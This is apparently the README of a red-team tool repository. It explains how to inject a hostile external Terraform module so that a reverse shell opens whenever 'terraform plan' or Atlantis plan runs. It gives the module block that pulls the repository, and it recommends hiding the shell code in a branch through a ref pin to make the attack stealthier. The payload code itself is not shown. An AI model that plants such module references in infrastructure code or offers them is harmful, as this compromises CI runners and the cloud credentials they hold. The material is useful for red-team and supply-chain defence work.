# tf-exec-module
Terraform file external dependency injection to get rev shell when terraform plan or atlantis plan is run.

module "trust_me_not" {
  source = "git@github.com:ardroci/tf-exec-module"
}
For an even more stealth attack you can use the ref feature to hide the terraform rev shell code in a branch inside of the repo, something like: git@github.com:ardroci/tf-exec-module?ref=b401d2b
